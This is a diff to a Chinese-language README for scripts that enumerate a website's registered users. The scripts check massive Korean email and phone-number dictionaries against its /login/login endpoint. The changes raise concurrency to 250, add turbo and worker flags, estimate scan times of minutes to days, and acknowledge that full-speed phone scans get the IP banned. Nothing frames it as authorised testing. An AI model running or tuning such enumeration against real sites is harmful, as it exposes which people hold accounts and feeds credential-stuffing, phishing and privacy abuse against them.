@@ -35,14 +35,14 @@ python3 gen_phones_kr.py sample10  # 010 采样 1000 万
 ## 邮箱枚举
 
 ```bash
-# 全量扫描 XL 字典（4.25 亿，80 并发约 30 天，建议分批或按域名过滤）
-python3 fast_email_enum.py --dict emails_kr_xl.txt --concurrency 80
+# 全速扫描（~650/s，并发250）
+python3 fast_email_enum.py --dict emails_kr_large.txt --concurrency 250
 
-# 基础字典（102 万，约 1.8 小时）
-python3 fast_email_enum.py --dict emails_kr_large.txt
+# XL 字典（4.25亿，约7.6天）
+python3 fast_email_enum.py --dict emails_kr_xl.txt --concurrency 250
 
 # 测试
-python3 fast_email_enum.py --limit 1000
+python3 fast_email_enum.py --limit 5000 --concurrency 250
 ```
 
 **命中判断**（`POST /login/login`）：
@@ -51,21 +51,19 @@ python3 fast_email_enum.py --limit 1000
 
 | 并发 | 速度 | 扫完 102 万 | 扫完 4.25 亿 |
 |------|------|-------------|--------------|
-| 80 | ~160/s | ~1.8 h | ~31 天 |
+| **250** | **~650/s** | **~26 分钟** | **~7.6 天** |
+| 80 (旧版) | ~50/s | ~5.7 小时 | ~99 天 |
 
 结果输出：`enum_hits.json`
 
 ## 手机号枚举
 
 ```bash
-# 推荐：先扫 targeted 邻域（2 万，几分钟）
-python3 fast_phone_enum.py --dict phones_kr_targeted.txt --concurrency 30
+# 推荐：targeted 邻域（2万）
+python3 fast_phone_enum.py --dict phones_kr_targeted.txt --concurrency 150 --turbo
 
-# 高命中段（1.28 亿，需长期跑）
-python3 fast_phone_enum.py --dict phones_kr_hot.txt --concurrency 30
-
-# 采样测试
-python3 fast_phone_enum.py --dict phones_010_sample1pct.txt --limit 5000
+# 高命中段全速（易封IP）
+python3 fast_phone_enum.py --dict phones_kr_hot.txt --concurrency 200 --workers 10 --turbo
 ```
 
 **前置条件**：需先 `GET /member/join` 获取 cookie。
